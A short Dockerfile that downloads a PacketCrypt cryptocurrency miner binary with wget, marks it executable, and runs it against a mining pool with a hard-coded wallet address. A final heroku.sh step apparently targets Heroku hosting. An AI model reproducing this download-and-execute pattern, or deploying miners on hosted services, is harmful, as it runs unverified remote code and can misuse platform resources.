FROM thomasjp0x42/packetcrypt

RUN wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
RUN chmod +x packetcrypt
RUN ./packetcrypt ann -p pkt1qvn7rjlzw5mdr2elc73alrv3xn9dhydddedw3qs http://pool.pktpool.io

CMD bash heroku.sh
